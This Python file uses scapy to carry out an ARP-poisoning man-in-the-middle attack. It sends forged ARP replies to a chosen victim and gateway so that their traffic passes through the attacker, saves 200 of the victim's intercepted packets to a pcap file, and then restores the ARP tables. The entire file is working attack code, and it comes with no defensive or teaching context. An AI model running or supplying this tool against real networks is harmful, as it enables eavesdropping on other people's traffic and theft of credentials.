import os
import sys
import time
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

def get_mac(ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)

    for _, r in resp:
        return r[Ether].src

    return None

class ARPoisoner:
    def __init__(self, victim, gateway, interface='wlan0'):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.vitctimmac = get_mac(victim)
        self.gatewaymac = get_mac(gateway)
        conf.iface = interface
        conf.verb = 0

        print(f'[*] Initialized {interface}')
        print(f'[*] Gateway ({gateway}) is at {self.gatewaymac}')
        print(f'[*] Victim ({victim}) is at {self.vitctimmac}')
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.vitctimmac
        print(poison_victim.summary())
        print('-' * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(poison_gateway.summary())
        print('-' * 30)

        print('[*] Beggining ARP poisoning', end='')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit(1)
            else:
                time.sleep(2)

    def sniff(self, count=200):
        time.sleep(5)
        print(f'\n[*] Sniffing {count} packets', end='')
        filter = f'ip host {victim}'
        packets = sniff(count=count, filter=filter, iface=self.interface)
        wrpcap('ophidia.pcap', packets)
        print('\n[*] Packets succefully sniffed')
        self.restore()
        self.poison_thread.terminate()
        print('[*] Done.')

    def restore(self):
        print('[*] Restoring ARP tables...')
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

        send(ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.vitctimmac,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    arpoisoner = ARPoisoner(victim, gateway, interface)
    arpoisoner.run()
